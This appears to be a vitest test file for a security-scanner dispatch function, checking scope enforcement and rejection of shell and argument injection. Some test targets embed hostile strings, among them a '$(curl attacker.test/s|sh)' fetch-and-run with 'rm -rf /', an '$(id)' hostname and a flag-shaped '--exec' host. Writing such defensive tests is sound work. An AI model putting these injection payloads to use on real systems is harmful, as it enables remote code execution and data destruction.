/**
 * dispatchTool() — the external-tool-execution chokepoint. Adversarial set
 * mirroring scope-egress-chokepoint.test.ts's methodology for scopedHttp,
 * plus the argument-injection guard specific to tool dispatch (execFile
 * with array args stops shell injection but not a flag-shaped substituted
 * value being reparsed by the tool's own arg parser).
 *
 * child_process.spawn is mocked with a fake EventEmitter-based child process
 * (dispatchTool uses spawn(), not execFile — see dispatch-tool.ts's
 * execFileNoStdin() comment: execFile's inherited stdin made nuclei hang
 * forever in a live Phase 3 test, confirmed by reproducing it standalone) so
 * every real command dispatchTool would issue is directly observable, and
 * ScopeGuard is mocked so scope decisions are deterministic per test case.
 */
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { EventEmitter } from 'events';

const { spawnImpl, isInScopeMock } = vi.hoisted(() => ({
  spawnImpl: vi.fn((_bin: string, _args: string[], _opts: any) => ({ stdout: 'ok', stderr: '', code: 0 })),
  isInScopeMock: vi.fn(),
}));

vi.mock('child_process', () => {
  function spawn(bin: string, args: string[], opts: any) {
    const child: any = new EventEmitter();
    child.stdout = new EventEmitter();
    child.stderr = new EventEmitter();
    const { stdout, stderr, code } = spawnImpl(bin, args, opts);
    queueMicrotask(() => {
      if (stdout) child.stdout.emit('data', Buffer.from(stdout));
      if (stderr) child.stderr.emit('data', Buffer.from(stderr));
      child.emit('close', code);
    });
    child.kill = vi.fn();
    return child;
  }
  return { spawn };
});

vi.mock('../middleware/scopeGuard', () => ({
  ScopeGuard: {
    getInstance: vi.fn().mockReturnValue({ isInScope: isInScopeMock }),
  },
}));

vi.mock('../utils/logger', () => ({
  default: { info: vi.fn(), warn: vi.fn(), error: vi.fn() },
}));

// This file's purpose is the shell-injection/argument-injection guarantees,
// not the restricted-tool policy gate (see action-policy-gate.test.ts for
// that) — always permit so nuclei/fuzzer test cases here don't need their
// own DB-backed program fixture.
vi.mock('../agents/ActionPolicyGate', () => ({
  checkAutomatedScanningAuthorization: vi.fn().mockResolvedValue({ allowed: true }),
  checkFuzzingAuthorization: vi.fn().mockResolvedValue({ allowed: true }),
}));

import {
  dispatchTool, ToolOutOfScopeError, ToolTargetInvalidError, ToolArgumentInjectionError,
  ToolShellUnsafeError,
} from '../lib/net/dispatch-tool';

const PROGRAM_ID = 101;

beforeEach(() => {
  spawnImpl.mockClear();
  isInScopeMock.mockReset();
});

describe('dispatchTool — adversarial set', () => {
  it('1. in-scope target → dispatched', async () => {
    isInScopeMock.mockResolvedValue({ allowed: true });
    const result = await dispatchTool({
      tool: 'nmap',
      target: 'https://example.com/path',
      args: ['-sV', '{domain}'],
      programId: PROGRAM_ID,
    });
    expect(spawnImpl).toHaveBeenCalledWith('nmap', ['-sV', 'example.com'], expect.any(Object));
    expect(result.stdout).toBe('ok');
  });

  it('2. out-of-scope target → blocked, never exec\'d', async () => {
    isInScopeMock.mockResolvedValue({ allowed: false, reason: 'URL not found in any in-scope patterns' });
    await expect(dispatchTool({
      tool: 'nmap',
      target: 'https://evil.com/',
      args: ['-sV', '{domain}'],
      programId: PROGRAM_ID,
    })).rejects.toThrow(ToolOutOfScopeError);
    expect(spawnImpl).not.toHaveBeenCalled();
  });

  it('3. excluded subdomain of an in-scope wildcard → blocked, never exec\'d', async () => {
    // ScopeGuard itself owns wildcard/exclusion logic (proven in
    // scope-egress-chokepoint.test.ts case 3) — dispatchTool's job is just to
    // honor whatever isInScope() says and never exec on a false verdict.
    isInScopeMock.mockResolvedValue({ allowed: false, reason: 'blocked by out-of-scope pattern: admin.example.com' });
    await expect(dispatchTool({
      tool: 'nikto',
      target: 'https://admin.example.com/panel',
      args: ['-h', '{url}'],
      programId: PROGRAM_ID,
    })).rejects.toThrow(ToolOutOfScopeError);
    expect(spawnImpl).not.toHaveBeenCalled();
  });

  it('4. guard throws → fail closed, never exec\'d', async () => {
    isInScopeMock.mockRejectedValue(new Error('DB connection lost'));
    await expect(dispatchTool({
      tool: 'sqlmap',
      target: 'https://example.com/?id=1',
      args: ['-u', '{url}', '--batch'],
      programId: PROGRAM_ID,
    })).rejects.toThrow('DB connection lost');
    expect(spawnImpl).not.toHaveBeenCalled();
  });

  it('5. a target containing shell metacharacters → REJECTED by the shell-unsafe guard, never exec\'d (Addition A hardening — previously "contained as inert data," now rejected outright since execFile only guarantees THIS process is safe, not a dispatched shell-script tool\'s own internals)', async () => {
    isInScopeMock.mockResolvedValue({ allowed: true });
    const hostile = 'https://example.com/$(curl attacker.test/s|sh)#;rm -rf /';
    await expect(dispatchTool({
      tool: 'whatweb',
      target: hostile,
      args: ['{url}'],
      programId: PROGRAM_ID,
    })).rejects.toThrow(ToolShellUnsafeError);
    expect(spawnImpl).not.toHaveBeenCalled();
  });

  it('6. (argument injection) a hostname that resolves to a flag-shaped bare placeholder → rejected, never exec\'d', async () => {
    isInScopeMock.mockResolvedValue({ allowed: true });
    // WHATWG URL does not enforce DNS label rules — this is a valid URL whose
    // hostname is the literal string "--exec.example.com" (confirmed via
    // `new URL('https://--exec.example.com/').hostname`).
    const flagShaped = 'https://--exec.example.com/';
    await expect(dispatchTool({
      tool: 'sqlmap',
      target: flagShaped,
      args: ['{domain}', '--batch'],
      programId: PROGRAM_ID,
    })).rejects.toThrow(ToolArgumentInjectionError);
    expect(spawnImpl).not.toHaveBeenCalled();
  });

  it('7. malformed target → ScopeGuard fails closed on it, never reaches exec (real isInScope already handles this — case 7 of scope-egress-chokepoint.test.ts)', async () => {
    isInScopeMock.mockResolvedValue({ allowed: false, reason: 'malformed / unparseable URL' });
    const result = dispatchTool({
      tool: 'nmap',
      target: 'not a url at all ??',
      args: ['{domain}'],
      programId: PROGRAM_ID,
    });
    await expect(result).rejects.toThrow(ToolOutOfScopeError);
    expect(spawnImpl).not.toHaveBeenCalled();
  });

  it('7b. dispatchTool\'s OWN URL validation is defense-in-depth, not just a pass-through of ScopeGuard\'s: a garbage target the guard (hypothetically) approves still gets rejected before exec', async () => {
    isInScopeMock.mockResolvedValue({ allowed: true }); // guard says yes; dispatchTool must not blindly trust that for substitution
    const result = dispatchTool({
      tool: 'nmap',
      target: 'not a url at all ??',
      args: ['{domain}'],
      programId: PROGRAM_ID,
    });
    await expect(result).rejects.toThrow(ToolTargetInvalidError);
    expect(spawnImpl).not.toHaveBeenCalled();
  });

  it('8. (shell-metacharacter guard, Addition A) a hostname with a shell metacharacter is rejected, never exec\'d', async () => {
    isInScopeMock.mockResolvedValue({ allowed: true });
    // new URL('https://a$(id)b.example.com/').hostname is literally "a$(id)b.example.com"
    // — WHATWG URL doesn't forbid $()` in hostnames, confirmed live.
    await expect(dispatchTool({
      tool: 'testssl.sh',
      target: 'https://a$(id)b.example.com/',
      args: ['{domain}:443'],
      programId: PROGRAM_ID,
    })).rejects.toThrow(ToolShellUnsafeError);
    expect(spawnImpl).not.toHaveBeenCalled();
  });

  it('8b. a pipe character surviving in the full URL is rejected too, never exec\'d (backtick is already percent-encoded by URL serialization itself — confirmed: new URL("https://x/`id`").toString() -> ".../%60id%60" — but | survives raw and is still explicitly rejected)', async () => {
    isInScopeMock.mockResolvedValue({ allowed: true });
    await expect(dispatchTool({
      tool: 'nikto',
      target: 'https://example.com/a|b',
      args: ['-h', '{url}'],
      programId: PROGRAM_ID,
    })).rejects.toThrow(ToolShellUnsafeError);
    expect(spawnImpl).not.toHaveBeenCalled();
  });

  it('8c. & and ; in a query string are ALLOWED for the full-URL substitution (real multi-param endpoints must stay probeable)', async () => {
    isInScopeMock.mockResolvedValue({ allowed: true });
    await dispatchTool({
      tool: 'nikto',
      target: 'https://example.com/search?a=1&b=2;c=3',
      args: ['-h', '{url}'],
      programId: PROGRAM_ID,
    });
    expect(spawnImpl).toHaveBeenCalled();
  });

  it('literal (non-placeholder) args pass through untouched, including ones starting with "-"', async () => {
    isInScopeMock.mockResolvedValue({ allowed: true });
    await dispatchTool({
      tool: 'nuclei',
      target: 'https://example.com/',
      args: ['-u', '{url}', '-severity', 'high,critical', '-silent'],
      programId: PROGRAM_ID,
    });
    expect(spawnImpl).toHaveBeenCalledWith('nuclei', ['-u', 'https://example.com/', '-severity', 'high,critical', '-silent'], expect.any(Object));
  });
});
